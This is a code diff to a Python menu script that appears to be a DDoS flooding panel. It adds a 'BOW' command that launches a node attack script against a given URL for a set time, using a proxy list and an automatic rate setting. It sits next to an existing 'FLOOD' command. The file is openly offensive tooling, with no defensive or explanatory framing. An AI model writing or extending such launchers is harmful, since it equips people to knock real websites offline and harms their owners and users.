@@ -331,6 +331,16 @@ def main():
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD https://example.com 120')
 
+                elif sinput == "BOW" or sinput == "bow":
+                        try:
+                                url = sin.split()[1]
+                                time = sin.split()[2]
+                                os.system ("clear")
+                                os.system(f'cd VIP && node BOW {url} {time} 10 proxy.txt autorate')  
+                        except (ValueError, IndexError):
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mBOW <url> <time>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mBOW https://example.com 120')
+
                 elif sinput == "BROWSER" or sinput == "browser":
                         try:
                                 url = sin.split()[1]
